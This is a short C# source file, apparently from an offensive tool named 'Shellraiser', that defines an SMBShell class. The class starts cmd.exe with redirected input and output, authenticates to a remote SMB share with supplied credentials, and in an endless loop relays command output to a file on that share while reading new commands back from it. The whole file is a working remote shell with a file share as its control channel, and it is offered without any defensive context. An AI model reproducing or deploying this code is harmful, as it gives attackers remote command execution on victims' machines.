using SharpCifs.Smb;
using System.Diagnostics;
using System;
using System.IO;


namespace Shellraiser
{
    public class SMBShell
    {
        private string ipaddress;
        private string username;
        private string password;
        private string share;
        private string path;
        private string command = "cmd.exe";
        private string arguments;
        private string unc;
        private SmbFile file;
        private ProcessStartInfo startInfo;
        private Process process;
        private StreamWriter writer;
        private StreamReader reader;

        public SMBShell(string ip, string username, string password, string share, string path)
        {
            ipaddress = ip;
            this.username = username;
            this.password = password;
            this.share = share;
            this.path = path;
            arguments = "/c " + command;
            unc = "smb://" + ipaddress + "/" + share + "/" + path;
            file = new SmbFile(unc, new NtlmPasswordAuthentication(null, this.username, this.password));
            startInfo = new ProcessStartInfo();
            startInfo.FileName = command;
            startInfo.Arguments = arguments;
            startInfo.RedirectStandardInput = true;
            startInfo.RedirectStandardOutput = true;
            startInfo.UseShellExecute = false;
            process = new Process();
            process.StartInfo = startInfo;
            process.Start();
            writer = new StreamWriter(file.GetOutputStream());
            reader = new StreamReader(file.GetInputStream());
            while (true)
            {
                writer.WriteLine(process.StandardOutput.ReadLine());
                writer.Flush();
                process.StandardInput.WriteLine(reader.ReadLine());
            }
        }
    }







}